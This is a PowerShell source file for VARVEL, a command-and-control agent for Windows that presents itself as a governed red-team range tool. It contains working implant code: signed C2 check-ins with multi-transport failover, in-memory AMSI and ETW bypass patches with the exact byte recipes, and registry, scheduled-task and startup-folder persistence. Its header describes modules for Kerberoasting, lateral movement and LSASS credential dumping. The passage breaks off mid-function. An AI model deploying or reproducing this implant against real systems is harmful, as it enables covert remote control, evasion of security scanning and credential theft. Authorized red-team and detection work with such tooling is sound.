# VARVEL - real first-stage agent for the authorized range (Windows / Win11 VM).
#
# This is a REAL callback-channel agent: it speaks the exact protocol the governed channel
# serves - HMAC-SHA256-signed check-ins with strictly-increasing sequences, task pull on
# GET, HMAC-bound results on POST, sha256-verified artifact staging, fetch-back, jittered
# cadence. Pure PowerShell, no dependencies, fileless-friendly for the practice range.
#
# GOVERNANCE (unchanged, by design):
#   - It runs ONLY where the operator puts it, on a signed-scope range target (the Win11
#     lab). The channel enforces scope + kill-list server-side; the agent has no say.
#   - No privilege tricks, no anti-forensics. Its job is to be a faithful post-ex
#     SIMULATION for governed red-team work - a real session the operator can task,
#     stage to, and pull from - not a covert implant.
#   - PERSISTENCE TIER (roadmap #8): persistence is now a governed capability - the
#     persist-* task kinds install USER-LAND relaunch points for THIS agent (HKCU
#     Run-key, user-context on-logon scheduled task, shell:startup .lnk) plus the DEEP
#     stage-2 techniques: comhijack (user-context HKCU classes-hive InprocServer32
#     hijack with candidate classification - safe-abandoned vs SHADOW - and a benign
#     throwaway-child resolve-proof on persist-status prove:true) and dllsearch (the
#     execproxy sideload plant of COPIES in the governed dir + a classic runkey/schtask
#     trigger pointing at the COPY) - default OFF, double-gated (engagement
#     persist.enabled AND -AllowPersist), with MANDATORY CLEANUP-PROOF (pre-install
#     snapshot, clobber-refusal + journal, write verified by re-read; removal VERIFIES
#     absence by re-read - a removal that cannot verify is a loud 'removal-failed',
#     escalated channel-side). No kernel, no SYSTEM services, no WMI subscriptions, no
#     HKLM hives this wave - see the ==PERSIST-LIB== block, mirrored in
#     agents/persist-host.ps1.
#   - EVASION TIER (stage 1, doctrine 2026-08-12: the old absolute no-evasion rule is
#     LIFTED for THIS governed tier): the evasion-* task kinds patch THIS agent's OWN
#     process memory (amsi/etw, well-published public recipes) - default OFF, double-
#     gated (engagement exec.evasion AND -AllowEvasion), snapshot-first, patch-VERIFIED
#     (official AMSI test-string flip, measured), restorable (restore re-verifies the
#     original bytes), hash-audited channel-side. Own-process and in-memory ONLY -
#     never another process, never the kernel, never disk; process exit = full restore.
#   - Every action is confined to its sandbox directory unless the operator explicitly
#     tasks otherwise. Artifact staging verifies sha256 before anything is written.
#
# Usage (on the range target):
#   powershell -ExecutionPolicy Bypass -File varvel-agent.ps1 -Url http://<channel-host>:<port> -AgentId <id> -Token <hex> [-Sandbox .\agentbox] [-Interval 3000] [-Jitter 2000] [-MaxLoops 0]
#   failover: add -Transports 'http,dns,icmp,doh,ws' [-FailAfter 5] [-DnsPort 5335] - K dead-wire
#   pulls cycle to the next transport; the channel can also re-task the transport live.
#   doh: -DohUrl / -DohThumbprint default to https://<host>:4453/dns-query + the lab pin.
#   ws: WebSocket PUSH wire on the SAME channel http server (/ws upgrade) - tasks arrive
#   as frames the instant they are queued; no poll cadence exists on this transport.
#   in-memory execution tier: add -AllowInMemoryExec to permit kind 'inline-dotnet'
#   (in-THIS-process .NET assembly execution; the engagement's exec.inMemory setting is
#   the other half of the gate; bytes never touch disk; sha256 audited channel-side).
#   evasion tier: add -AllowEvasion to permit kinds 'evasion-enable' / 'evasion-restore'
#   / 'evasion-status' (own-process AMSI/ETW patching; the engagement's exec.evasion
#   setting is the other half of the gate; every patch is snapshot-first, verified,
#   and restorable - see the ==EVASION-LIB== block, mirrored in agents/evasion-host.ps1).
#   persistence tier: add -AllowPersist to permit kinds 'persist-install' /
#   'persist-status' / 'persist-remove' / 'persist-audit' (user-land relaunch points for
#   THIS agent - classic runkey/schtask/startup plus deep comhijack/dllsearch; the
#   engagement's persist.enabled setting is the other half of the gate;
#   cleanup-proof: verified install, verified removal, journaled clobber-restore - see
#   the ==PERSIST-LIB== block, mirrored in agents/persist-host.ps1).
#   signed-proxy execution tier: add -AllowProxyExec to permit kinds 'execproxy-run' /
#   'execproxy-remove' / 'execproxy-status' (run the agent's DLL form through
#   Microsoft-signed hosts - rundll32-class direct load, regsvr32-class load-only,
#   sideload-class search-order plant of COPIES inside the sandbox only; the
#   engagement's exec.proxy setting is the other half of the gate; cleanup-proof -
#   see the ==EXECPROXY-LIB== block, mirrored in agents/execproxy-host.ps1).
#   GOVERNED AD TIER (lose-point #3 - a company-PC breach is an AD engagement):
#   add -AllowAdRoast to permit kinds 'adroast-enum' / 'adroast-kerberoast' /
#   'adroast-asrep' (SPN / DONT_REQ_PREAUTH collection; raw ticket bytes ride back
#   and are hashcat-formatted channel-side; cracking is OFFLINE operator-side -
#   see ==ADROAST-LIB==; engagement ad.roast is the other gate half). Add
#   -AllowLateral for 'lateral-exec' / 'lateral-remove' / 'lateral-status' (wmi /
#   winrm / psexec-class on scope-checked range IPs with operator-supplied creds;
#   artifact manifest with cleanup-proof verified removal - see ==LATERAL-LIB==;
#   engagement ad.lateral is the other half). Add -AllowCredAccess for 'cred-dump' /
#   'cred-dump-remove' / 'cred-dump-status' (LSASS via the comsvcs MiniDump LOLBin;
#   the dump stays in the governed sandbox, sha256+marker audited, edrview pairing
#   MANDATORY - see ==CREDHOST-LIB==; engagement cred.access is the other half).

param(
  [Parameter(Mandatory=$true)][string]$Url,
  [Parameter(Mandatory=$true)][string]$AgentId,
  [Parameter(Mandatory=$true)][string]$Token,
  [string]$Sandbox = (Join-Path $PWD 'agentbox'),
  [int]$Interval = 3000,
  [int]$Jitter = 2000,
  [int]$MaxLoops = 0,          # 0 = run until killed (Ctrl-C / channel kill)
  [string]$Transport = 'http', # http = /c /r routes - dns-http = /d carrier - dns-udp = real DNS wire (UDP) - icmp = real ICMP wire (raw socket, needs admin) - doh = DNS-over-HTTPS (RFC 8484, TLS, thumbprint-pinned) - ws = WebSocket PUSH (RFC 6455 /ws upgrade on the channel http server; tasks pushed as frames, no polling)
  [string]$DnsDomain = 'ax.sim',
  [string]$Transports = '',    # gap#5 failover: comma list, e.g. 'http,dns,icmp,doh,ws' ('dns' = dns-udp) - empty = single -Transport (back-compat)
  [int]$FailAfter = 5,         # consecutive dead-wire pulls before cycling to the next transport in -Transports
  [int]$DnsPort = 0,           # 0 = legacy (DNS wire uses the -Url port, else 5335) - >0 = explicit DNS wire port (failover serves http AND dns from one -Url)
  [string]$DohUrl = '',        # gap#2 DoH: RFC 8484 endpoint - empty derives 'https://<host-from--Url>:4453/dns-query'
  [string]$DohThumbprint = '', # gap#2 DoH: server cert SHA256 pin (uppercase hex, no colons) - empty = the lab pin below
  [switch]$AllowInMemoryExec,  # in-memory execution tier: agent-side half of the inline-dotnet gate (default OFF)
  [switch]$AllowEvasion,       # evasion internals tier (stage 1): agent-side half of the evasion-* gate (default OFF)
  [switch]$AllowPersist,       # governed persistence tier (roadmap #8): agent-side half of the persist-* gate (default OFF)
  [switch]$AllowProxyExec,     # signed-proxy execution tier: agent-side half of the execproxy-* gate (default OFF)
  [switch]$AllowAdRoast,       # governed AD tier rung 1: agent-side half of the adroast-* gate (default OFF; engagement ad.roast is the other half)
  [switch]$AllowLateral,       # governed AD tier rung 2: agent-side half of the lateral-* gate (default OFF; engagement ad.lateral is the other half)
  [switch]$AllowCredAccess,    # governed AD tier rung 3: agent-side half of the cred-dump-* gate (default OFF; engagement cred.access is the other half)
  [int]$TaskTimeoutSec = 45,      # wedge guard: per-shell-task SOFT timeout (tree-kill inside the harness)
  [int]$TaskHardTimeoutSec = 120, # wedge guard: outer wall-clock cap - covers a wedged/faulted inner guard (the MpCmdRun class); enforced >= TaskTimeoutSec + 15 at init
  [int]$TaskHeartbeatSec = 10     # wedge guard: mid-task channel checkin cadence (0 = off) - keeps lastSeen alive while a task runs
)

$ErrorActionPreference = 'Stop'
$Url = $Url.TrimEnd('/')
# gap#2 DoH lab pin: SHA256 thumbprint of the channel's STATIC LAB-ONLY self-signed cert
# (varvel/engine/doh-labcert.mjs). TLS trust is a PIN on this exact value, never a
# validation bypass (see Set-DohTlsPin). Operator certs: pass -DohThumbprint to match.
$script:DohLabThumbprint = '75196C9AC3C596F072C8A22D6F3D76B96DEABF811C731D0ACAC1F3C3876812B1'
if ($DohThumbprint.Trim().Length -eq 0) { $DohThumbprint = $script:DohLabThumbprint }
if ($DohUrl.Trim().Length -eq 0) {
  $dohHost = ($Url -replace '^[a-z]+://', '').Split(':')[0].Trim('/')
  $DohUrl = 'https://' + $dohHost + ':4453/dns-query'
}
New-Item -ItemType Directory -Force -Path $Sandbox | Out-Null
$Sandbox = (Resolve-Path $Sandbox).Path
$script:Seq = 0
$script:LastPullOk = $false        # wire liveness of the LAST pull - set in every pull path (gap#5 failover)
$script:AssignedTransport = $null  # channel-assigned transport switch, honored next cycle when workable (gap#5)
$script:WsSock = $null             # gap#4 ws PUSH wire: System.Net.WebSockets.ClientWebSocket when connected
$script:WsRecvTask = $null         # the ONE pending ReceiveAsync (overlapping receives are illegal on ClientWebSocket)
$script:WsBuf = $null              # receive scratch buffer, allocated per connection
# Wedge-guard invariants: the outer net must outlive the inner soft timeout + the
# kill/settle margin, else the hard cap would Stop() a guard that was already finishing.
if ($TaskHardTimeoutSec -lt $TaskTimeoutSec + 15) { $TaskHardTimeoutSec = $TaskTimeoutSec + 15 }
$script:PendingTasks = @()         # tasks delivered by mid-task heartbeats - run serially after the current one

function Get-HmacHex([string]$Key, [string]$Message) {
  $h = [System.Security.Cryptography.HMACSHA256]::new([Text.Encoding]::UTF8.GetBytes($Key))
  try { return ([BitConverter]::ToString($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($Message)))).Replace('-','').ToLower() }
  finally { $h.Dispose() }
}
function Get-Sha256Hex([byte[]]$Bytes) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash($Bytes))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}
function Resolve-Sandbox([string]$Path) {
  $full = if ([IO.Path]::IsPathRooted($Path)) { [IO.Path]::GetFullPath($Path) } else { [IO.Path]::GetFullPath((Join-Path $Sandbox $Path)) }
  if (-not $full.StartsWith($Sandbox, [StringComparison]::OrdinalIgnoreCase)) { throw "path outside sandbox: $Path" }
  return $full
}

# ==EVASION-LIB== begin (mirror: agents/evasion-host.ps1) -----------------------------
# EVASION INTERNALS TIER (stage 1, doctrine 2026-08-12): governed, own-process-only,
# in-memory AMSI/ETW neutralization. Snapshot-first, patch-VERIFIED (byte re-read + the
# official AMSI test-string flip, measured never assumed), restore re-verified, hash-
# evidenced. The -AllowEvasion gate is checked in the task cases BEFORE anything here
# runs; the engagement exec.evasion gate already decided channel-side. This block is
# byte-identical to the one in agents/evasion-host.ps1 by convention (the Node-side
# persistent host) - change one, change the other.

function Get-VvSha256Hex([byte[]]$Bytes) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash($Bytes))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}

# The patch recipes - the well-published, public in-memory neutralizations. The channel
# never ships these bytes: the recipe lives agent-side only; the channel audits its
# sha256 (engine/evasion.mjs EVASION_RECIPES - keep the two copies in lockstep).
function Get-VvEvasionRecipe([string]$Tech) {
  switch ($Tech) {
    'amsi' { return @{ Dll = 'amsi.dll'; Export = 'AmsiScanBuffer'; Patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3); Note = 'mov eax,0x80070057; ret - in-memory AmsiScanBuffer neutralization (well-published public tradecraft)' } }
    'etw'  { return @{ Dll = 'ntdll.dll'; Export = 'EtwEventWrite'; Patch = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3); Note = 'mov eax,0; ret - in-memory EtwEventWrite success-noop (well-published public tradecraft)' } }
    default { throw "unknown evasion technique: $Tech (stage 1 ships amsi, etw only - own-process, in-memory, nothing else)" }
  }
}

$script:VvEvasionState = @{}   # technique -> @{ Address; Original; Patch; State }

function Initialize-VvEvasion {
  if ('VvEvasionNative' -as [type]) { return }
  # Add-Type JIT-compiles the P/Invoke shim once per process (PS 5.1: transient csc temp
  # files under %TEMP% - .NET framework noise, never payload bytes; PS 7+: in-memory).
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class VvEvasionNative {
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode)] public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode)] public static extern IntPtr LoadLibrary(string lpFileName);
  [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi.dll", CharSet=CharSet.Unicode)] public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);
  [DllImport("amsi.dll")] public static extern int AmsiOpenSession(IntPtr amsiContext, out IntPtr amsiSession);
  [DllImport("amsi.dll", CharSet=CharSet.Unicode)] public static extern int AmsiScanString(IntPtr amsiContext, string content, string contentName, IntPtr amsiSession, out int result);
  [DllImport("amsi.dll")] public static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr amsiSession);
  [DllImport("amsi.dll")] public static extern void AmsiUninitialize(IntPtr amsiContext);
}
'@
}

function Read-VvBytes([IntPtr]$Addr, [int]$Len) {
  $b = New-Object byte[] $Len
  [System.Runtime.InteropServices.Marshal]::Copy($Addr, $b, 0, $Len)
  return $b
}
function Write-VvBytes([IntPtr]$Addr, [byte[]]$Bytes) {
  [System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Addr, $Bytes.Length)
}
function Test-VvBytesEqual([byte[]]$A, [byte[]]$B) {
  if ($null -eq $A -or $null -eq $B -or $A.Length -ne $B.Length) { return $false }
  for ($i = 0; $i -lt $A.Length; $i++) { if ($A[$i] -ne $B[$i]) { return $false } }
  return $true
}

function Get-VvEvasionTarget([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $mod = [VvEvasionNative]::GetModuleHandle($recipe.Dll)
  if ($mod -eq [IntPtr]::Zero) { $mod = [VvEvasionNative]::LoadLibrary($recipe.Dll) }
  if ($mod -eq [IntPtr]::Zero) { throw "cannot load $($recipe.Dll) into this process" }
  $addr = [VvEvasionNative]::GetProcAddress($mod, $recipe.Export)
  if ($addr -eq [IntPtr]::Zero) { throw "cannot resolve $($recipe.Dll)!$($recipe.Export) in this process" }
  return $addr
}

# The OFFICIAL Microsoft AMSI test string (AMSI Test Sample: 7e72c3ce-861b-4339-8740-
# 0ac1484c1386), scanned IN THIS PROCESS through the real provider chain. Returns
# 'blocked' (the provider flagged it: result >= 0x4001 - DETECTED or BLOCKED-BY-ADMIN),
# 'clear' (clean, not-detected, OR the scan call itself failed - post-patch the patched
# AmsiScanBuffer returns E_INVALIDARG and the content is never evaluated), or
# 'unavailable:<hr>' when AMSI cannot even initialize in this process (honest third
# state - a flip cannot be proven against an unavailable scanner).
function Invoke-VvAmsiTestScan {
  $ctx = [IntPtr]::Zero; $sess = [IntPtr]::Zero
  try {
    $hr = [VvEvasionNative]::AmsiInitialize('VARVEL-evasion-verify', [ref]$ctx)
    if ($hr -ne 0 -or $ctx -eq [IntPtr]::Zero) { return ('unavailable:0x{0:x8}' -f $hr) }
    $hr = [VvEvasionNative]::AmsiOpenSession($ctx, [ref]$sess)
    if ($hr -ne 0) { return ('unavailable:0x{0:x8}' -f $hr) }
    $res = 0
    $hr = [VvEvasionNative]::AmsiScanString($ctx, 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386', 'varvel-evasion-verify', $sess, [ref]$res)
    if ($hr -ne 0) { return 'clear' } # the scan itself failed - content never evaluated (the patched state)
    return $(if ($res -ge 0x4001) { 'blocked' } else { 'clear' })
  } catch {
    return ('unavailable:' + $_.Exception.Message)
  } finally {
    if ($sess -ne [IntPtr]::Zero) { try { [VvEvasionNative]::AmsiCloseSession($ctx, $sess) } catch {} }
    if ($ctx -ne [IntPtr]::Zero) { try { [VvEvasionNative]::AmsiUninitialize($ctx) } catch {} }
  }
}

function Enable-VvEvasionTech([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $ev = [ordered]@{
    state = 'failed'; recipe = ($recipe.Dll + '!' + $recipe.Export); recipeNote = $recipe.Note
    recipeSha256 = (Get-VvSha256Hex $recipe.Patch)
    originalSha256 = $null; patchedSha256 = $null; restoredSha256 = $null
    byteVerified = $false; restoreVerified = $false; verify = $null; note = $null; error = $null
  }
  try {
    Initialize-VvEvasion
    $addr = Get-VvEvasionTarget $Tech
    $patch = [byte[]]$recipe.Patch
    # MEASURED BEFORE-STATE (amsi): scan the official test string pre-patch.
    $scanBefore = $null
    if ($Tech -eq 'amsi') { $scanBefore = Invoke-VvAmsiTestScan }
    # SNAPSHOT FIRST - the cleanup doctrine: never write bytes you cannot put back.
    $orig = Read-VvBytes $addr $patch.Length
    $ev.originalSha256 = Get-VvSha256Hex $orig
    $oldProtect = [uint32]0
    if (-not [VvEvasionNative]::VirtualProtect($addr, [UIntPtr][uint32]$patch.Length, 0x40, [ref]$oldProtect)) { throw 'VirtualProtect(PAGE_EXECUTE_READWRITE) refused' }
    Write-VvBytes $addr $patch
    $tmp = [uint32]0
    [void][VvEvasionNative]::VirtualProtect($addr, [UIntPtr][uint32]$patch.Length, $oldProtect, [ref]$tmp)
    # PROVE the write: re-read and byte-compare. No compare, no claim.
    $readback = Read-VvBytes $addr $patch.Length
    $ev.byteVerified = Test-VvBytesEqual $readback $patch
    if (-not $ev.byteVerified) { throw 'patch write did NOT verify (re-read mismatch) - the write did not take; nothing claimed' }
    $ev.patchedSha256 = Get-VvSha256Hex $patch
    if ($Tech -eq 'amsi') {
      $scanAfter = Invoke-VvAmsiTestScan
      $ev.verify = [ordered]@{
        probe = 'official-amsi-test-string (in-process AmsiScanString)'
        before = $scanBefore; after = $scanAfter
        flipProven = ($scanBefore -eq 'blocked' -and $scanAfter -eq 'clear')
      }
      if (-not $ev.verify.flipProven) { $ev.note = 'bytes patched + verified, but the blocked->clear flip was NOT measured (before=' + $scanBefore + ', after=' + $scanAfter + ') - patch state is byte-proven only; the scanner may be off/absent on this host' }
    } else {
      $ev.verify = [ordered]@{
        probe = 'byte-reverify only'
        before = $null; after = $null; flipProven = $false
        functional = 'not-probed (stage 1: ETW neutralization is byte-verified; its end-to-end effect is the detoracle measurement on the next probe, not a claim made here)'
      }
    }
    $script:VvEvasionState[$Tech] = @{ Address = $addr; Original = $orig; Patch = $patch; State = 'patched' }
    $ev.state = 'patched'
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

function Restore-VvEvasionTech([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $ev = [ordered]@{
    state = 'restored'; recipe = ($recipe.Dll + '!' + $recipe.Export); recipeNote = $recipe.Note
    recipeSha256 = (Get-VvSha256Hex $recipe.Patch)
    originalSha256 = $null; patchedSha256 = $null; restoredSha256 = $null
    byteVerified = $false; restoreVerified = $false; verify = $null; note = $null; error = $null
  }
  $st = $script:VvEvasionState[$Tech]
  if ($null -eq $st -or $st.State -ne 'patched') {
    $ev.note = 'no live patch in THIS process - nothing to restore (in-memory patches never survive process exit; this process was already clean)'
    return $ev
  }
  try {
    Initialize-VvEvasion
    $orig = [byte[]]$st.Original
    $ev.originalSha256 = Get-VvSha256Hex $orig
    $ev.patchedSha256 = Get-VvSha256Hex ([byte[]]$st.Patch)
    $oldProtect = [uint32]0
    if (-not [VvEvasionNative]::VirtualProtect($st.Address, [UIntPtr][uint32]$orig.Length, 0x40, [ref]$oldProtect)) { throw 'VirtualProtect(PAGE_EXECUTE_READWRITE) refused on restore' }
    Write-VvBytes $st.Address $orig
    $tmp = [uint32]0
    [void][VvEvasionNative]::VirtualProtect($st.Address, [UIntPtr][uint32]$orig.Length, $oldProtect, [ref]$tmp)
    # PROVE the restore: re-read must equal the SNAPSHOT bytes, exactly.
    $readback = Read-VvBytes $st.Address $orig.Length
    $ev.restoreVerified = Test-VvBytesEqual $readback $orig
    if (-not $ev.restoreVerified) { throw 'restore write did NOT verify (re-read != snapshot) - the region is NOT restored; this is a loud failure, not a quiet lie' }
    $ev.restoredSha256 = $ev.originalSha256
    if ($Tech -eq 'amsi') {
      # MEASURED flip-BACK: the official test string must be blocked again.
      $scanAfter = Invoke-VvAmsiTestScan
      $ev.verify = [ordered]@{
        probe = 'official-amsi-test-string (in-process AmsiScanString)'
        before = 'clear'; after = $scanAfter
        flipBackProven = ($scanAfter -eq 'blocked')
      }
      if (-not $ev.verify.flipBackProven) { $ev.note = 'original bytes restored + verified, but the clear->blocked flip-back was NOT measured (after=' + $scanAfter + ') - the scanner may be off/absent on this host' }
    } else {
      $ev.verify = [ordered]@{ probe = 'byte-reverify only'; before = $null; after = $null; flipBackProven = $false; functional = 'not-probed (stage 1: byte-verified restore)' }
    }
    $st.State = 'restored'
    $ev.state = 'restored'
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

function Get-VvEvasionStatusTech([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $st = $script:VvEvasionState[$Tech]
  $ev = [ordered]@{
    state = $(if ($null -eq $st) { 'not-applied' } else { [string]$st.State })
    recipe = ($recipe.Dll + '!' + $recipe.Export); recipeNote = $recipe.Note
    recipeSha256 = (Get-VvSha256Hex $recipe.Patch)
    originalSha256 = $null; patchedSha256 = $null; restoredSha256 = $null
    byteVerified = $false; restoreVerified = $false; verify = $null; note = $null; error = $null
  }
  if ($null -ne $st) {
    $ev.originalSha256 = Get-VvSha256Hex ([byte[]]$st.Original)
    $ev.patchedSha256 = Get-VvSha256Hex ([byte[]]$st.Patch)
    if ($st.State -eq 'restored') { $ev.restoredSha256 = $ev.originalSha256; $ev.restoreVerified = $true }
    if ($st.State -eq 'patched') {
      # Live re-read: status RE-PROVES the patch is still in place right now (measured,
      # not remembered). A mismatch flips the honest state to 'tampered'.
      try {
        Initialize-VvEvasion
        $cur = Read-VvBytes $st.Address ([byte[]]$st.Patch).Length
        $ev.byteVerified = Test-VvBytesEqual $cur ([byte[]]$st.Patch)
        if (-not $ev.byteVerified) { $ev.state = 'tampered'; $ev.note = 'live re-read != patch bytes - the region changed since the write (someone restored or re-patched it); reporting honestly' }
      } catch { $ev.note = 'live re-verify failed: ' + $_.Exception.Message }
    }
  } else {
    $ev.note = 'never patched in this process'
  }
  return $ev
}

# Dispatch one op into a result JSON string. $Op: enable | restore | status.
# $Techniques: string[] or empty (restore/status with none = all known / all patched).
function Invoke-VvEvasionOp([string]$Op, [string[]]$Techniques) {
  $known = @('amsi', 'etw')
  $techMap = [ordered]@{}
  if ($Op -eq 'enable') {
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) { throw 'evasion-enable: techniques is empty - nothing to do' }
    foreach ($t in $Techniques) {
      if ($known -notcontains $t) { throw "unknown evasion technique: $t (stage 1 ships amsi, etw only - own-process, in-memory, nothing else)" }
      $techMap[$t] = Enable-VvEvasionTech $t
    }
  } elseif ($Op -eq 'restore') {
    $targets = @()
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) {
      foreach ($t in $known) { $st = $script:VvEvasionState[$t]; if ($null -ne $st -and $st.State -eq 'patched') { $targets += $t } }
      if ($targets.Count -eq 0) { $targets = $known } # nothing live: report the honest no-op per technique
    } else {
      foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown evasion technique: $t" } }
      $targets = $Techniques
    }
    foreach ($t in $targets) { $techMap[$t] = Restore-VvEvasionTech $t }
  } elseif ($Op -eq 'status') {
    foreach ($t in $known) { $techMap[$t] = Get-VvEvasionStatusTech $t }
  } else {
    throw "unknown evasion op: $Op (want enable | restore | status)"
  }
  # Aggregate state: 'failed' if ANY failed (a partial patch is never dressed up as a
  # win); else the op's success state; status aggregates 'untouched' / 'patched' /
  # 'restored' / 'mixed' from the per-technique truth.
  $states = @($techMap.Values | ForEach-Object { [string]$_.state })
  if ($states -contains 'failed') { $agg = 'failed' }
  elseif ($Op -eq 'enable') { $agg = 'patched' }
  elseif ($Op -eq 'restore') { $agg = 'restored' }
  else {
    if (($states | Where-Object { $_ -ne 'not-applied' }).Count -eq 0) { $agg = 'untouched' }
    elseif ($states -contains 'patched') { $agg = 'patched' }
    elseif (($states | Where-Object { $_ -eq 'restored' }).Count -eq $states.Count) { $agg = 'restored' }
    else { $agg = 'mixed' }
  }
  $result = [ordered]@{ op = $Op; pid = $PID; state = $agg; techniques = $techMap; at = [DateTime]::UtcNow.ToString('o') }
  return ($result | ConvertTo-Json -Compress -Depth 6)
}

# ==EVASION-LIB== end -----------------------------------------------------------------

# ==PERSIST-LIB== begin (mirror: agents/persist-host.ps1) -----------------------------
# GOVERNED PERSISTENCE TIER (roadmap #8): standard red-team persistence for the Windows
# range agent, shipped the VARVEL way - default-OFF, double-gated (the -AllowPersist
# gate is checked in the task cases BEFORE anything here runs; the engagement
# persist.enabled gate already decided channel-side), fully audited, with MANDATORY
# CLEANUP-PROOF: install snapshots pre-install state first (never write what you cannot
# put back), refuses to clobber a foreign value unless overwrite+journal, PROVES the
# write by re-read; remove VERIFIES absence by re-read (a verify failure is
# 'removal-failed' - loud, escalated, never a quiet lie). Windows USER-LAND ONLY:
# runkey (HKCU Run value), schtask (user-context on-logon task, RunLevel Limited),
# startup (shell:startup .lnk) - no kernel, no SYSTEM services, no WMI subscriptions.
# This block is byte-identical to the one in agents/persist-host.ps1 by convention (the
# Node-side persistent host) - change one, change the other.

function Get-VvPersistSha256Hex([string]$Text) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash([Text.Encoding]::UTF8.GetBytes([string]$Text)))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}

function Get-VvPersistTag([string]$Seed) { return 'VARVEL-' + (Get-VvPersistSha256Hex $Seed).Substring(0, 8) }

function Test-VvPersistName([string]$Name) { return ([string]$Name -match '^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$') }

# Split a relaunch command line into executable + argument tail (quoted-exe aware). The
# CANONICAL value form - (Exe + ' ' + Args).Trim() - is what registry values, scheduled
# task actions, and .lnk TargetPath/Arguments all round-trip to, so every compare runs
# through it (a quoted exe loses its quotes inside a .lnk; the canonical form does not).
function Split-VvCommandLine([string]$Target) {
  $t = ([string]$Target).Trim()
  if ($t.StartsWith('"')) {
    $i = $t.IndexOf('"', 1)
    if ($i -gt 1) { return @{ Exe = $t.Substring(1, $i - 1); Args = $t.Substring($i + 1).Trim() } }
  }
  $sp = $t.IndexOf(' ')
  if ($sp -lt 0) { return @{ Exe = $t; Args = '' } }
  return @{ Exe = $t.Substring(0, $sp); Args = $t.Substring($sp + 1).Trim() }
}
function ConvertTo-VvCanonicalTarget([string]$Target) {
  $p = Split-VvCommandLine $Target
  return (($p.Exe + ' ' + $p.Args).Trim())
}

# The canonical user-land locations (stage 1). $Name is the operator-visible handle
# ('VARVEL-<sha8>' by default, or an operator-chosen name) - every location is
# user-context only.
function Get-VvPersistLoc([string]$Tech, [string]$Name) {
  switch ($Tech) {
    'runkey' {
      return @{ Technique = 'runkey'; Name = $Name; RegPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; ValueName = $Name; Location = ('HKCU\Software\Microsoft\Windows\CurrentVersion\Run\' + $Name) }
    }
    'schtask' {
      return @{ Technique = 'schtask'; Name = $Name; TaskName = $Name; Location = ('\' + $Name) }
    }
    'startup' {
      $lnk = Join-Path ([Environment]::GetFolderPath('Startup')) ($Name + '.lnk')
      return @{ Technique = 'startup'; Name = $Name; LnkPath = $lnk; Location = $lnk }
    }
    default { throw "unknown persist technique: $Tech (stage 1 ships runkey, schtask, startup only - Windows user-land; no kernel, no SYSTEM services, no WMI subscriptions)" }
  }
}

function Probe-VvPersistTech($Loc) {
  switch ($Loc.Technique) {
    'runkey' {
      $item = Get-ItemProperty -LiteralPath $Loc.RegPath -Name $Loc.ValueName -ErrorAction SilentlyContinue
      if ($null -ne $item -and $null -ne $item.($Loc.ValueName)) { return @{ Present = $true; Value = [string]$item.($Loc.ValueName) } }
      return @{ Present = $false; Value = $null }
    }
    'schtask' {
      $t = Get-ScheduledTask -TaskName $Loc.TaskName -ErrorAction SilentlyContinue
      if ($null -eq $t) { return @{ Present = $false; Value = $null } }
      $a = @($t.Actions)[0]
      $val = ''
      if ($null -ne $a) { $val = ([string]$a.Execute + ' ' + [string]$a.Arguments).Trim() }
      return @{ Present = $true; Value = $val }
    }
    'startup' {
      if (-not (Test-Path -LiteralPath $Loc.LnkPath)) { return @{ Present = $false; Value = $null } }
      $ws = New-Object -ComObject WScript.Shell
      try {
        $sc = $ws.CreateShortcut($Loc.LnkPath)
        $val = ([string]$sc.TargetPath + ' ' + [string]$sc.Arguments).Trim()
      } finally { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($ws) }
      return @{ Present = $true; Value = $val }
    }
  }
}

function Apply-VvPersistTech($Loc, [string]$Target) {
  switch ($Loc.Technique) {
    'runkey' {
      New-ItemProperty -LiteralPath $Loc.RegPath -Name $Loc.ValueName -Value ([string]$Target) -PropertyType String -Force -ErrorAction Stop | Out-Null
    }
    'schtask' {
      $parts = Split-VvCommandLine $Target
      if ($parts.Args.Length -gt 0) { $action = New-ScheduledTaskAction -Execute $parts.Exe -Argument $parts.Args -ErrorAction Stop }
      else { $action = New-ScheduledTaskAction -Execute $parts.Exe -ErrorAction Stop }
      $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction Stop
      $principal = New-ScheduledTaskPrincipal -UserId ([Security.Principal.WindowsIdentity]::GetCurrent().Name) -LogonType Interactive -RunLevel Limited -ErrorAction Stop
